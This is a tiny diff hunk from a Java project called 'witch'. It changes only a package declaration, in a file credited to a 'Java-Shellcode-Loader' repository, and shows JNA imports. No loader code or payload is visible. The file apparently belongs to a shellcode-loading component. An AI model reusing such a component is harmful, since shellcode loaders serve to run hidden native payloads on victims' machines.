@@ -1,5 +1,5 @@
 //Code originally from https://github.com/yzddmr6/Java-Shellcode-Loader
-package me.soda.witch.features;
+package me.soda.witch.client.features;
 
 import com.sun.jna.Memory;
 import com.sun.jna.Native;
